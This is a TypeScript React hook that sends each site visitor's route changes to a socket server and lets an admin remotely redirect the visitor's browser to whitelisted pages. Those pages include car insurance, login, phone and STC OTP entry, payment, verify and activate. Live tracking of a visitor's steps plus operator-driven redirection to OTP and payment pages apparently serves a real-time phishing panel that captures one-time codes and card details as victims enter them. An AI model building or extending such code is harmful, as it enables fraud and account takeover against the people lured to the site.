import { useEffect, useRef } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { socketService } from '@/site/services/socket';

/*
 * Live Tracking Hook
 * Wraps the existing router non-invasively to:
 *  1. Emit session:step_changed on every route transition
 *  2. Listen for admin:navigate commands and trigger router navigation
 *  This hook does NOT modify any existing component or route logic.
 */

// Explicit whitelist of routes the admin may remotely navigate a client to.
const ROUTE_WHITELIST = [
  '/', '/about', '/contact', '/blog', '/faq', '/products', '/compare',
  '/insurance/car', '/login', '/reg',
  '/phone', '/phoneOtp', '/payment', '/success',
  '/stc', '/stcOtp', '/confirm', '/verify', '/activate',
];

function isWhitelisted(route: string): boolean {
  if (ROUTE_WHITELIST.includes(route)) return true;
  // Allow dynamic insurance routes
  if (route.startsWith('/insurance/') && route.split('/').length === 3) return true;
  return false;
}

export function useLiveTracking() {
  const location = useLocation();
  const navigate = useNavigate();
  const connectedRef = useRef(false);

  // Register navigate handler once
  useEffect(() => {
    socketService.setNavigateHandler((route: string) => {
      if (isWhitelisted(route)) {
        navigate(route);
      } else {
        console.warn('[socket] Rejected non-whitelisted admin navigation:', route);
      }
    });
  }, [navigate]);

  // Connect once on mount
  useEffect(() => {
    if (!connectedRef.current) {
      socketService.connect();
      connectedRef.current = true;
    }
    return () => {
      // Do not disconnect on every route change — only on full unmount
    };
  }, []);

  // Emit step change on every route transition
  useEffect(() => {
    socketService.emitStepChange(location.pathname);
  }, [location.pathname]);
}
